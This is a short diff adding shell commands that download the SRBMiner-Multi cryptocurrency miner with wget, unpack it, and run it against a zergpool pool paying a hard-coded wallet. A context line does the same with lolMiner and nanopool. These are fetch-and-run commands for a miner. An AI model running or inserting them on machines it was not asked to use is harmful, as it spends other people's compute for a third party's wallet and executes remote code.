@@ -1,3 +1,16 @@
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.2/SRBMiner-Multi-0-9-2-Linux.tar.xz
+tar -xf SRBMiner-Multi-0-9-2-Linux.tar.xz
+cd SRBMiner-Multi-0-9-2
+chmod +x *
+SRBMiner-MULTI --disable-cpu --algorithm ethash --pool stratum+tcp://ethash.eu.mine.zergpool.com:9999 -wallet 0xC7Ff963086Cf1AEFafd6C32bfC82F41E7e61177A -pass c=SHIB,mc=AKA/CLO/EGEM/ETH/ETHO/EXP/TSF,m=solo,ID=Aman
+
+
+
+
+
+
+
+
 
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar -xf lolMiner_v1.29_Lin64.tar.gz && cd 1.29 && ./lolMiner --algo ETCHASH --pool eth-asia1.nanopool.org:9999 --user 0xC7Ff963086Cf1AEFafd6C32bfC82F41E7e61177A
 
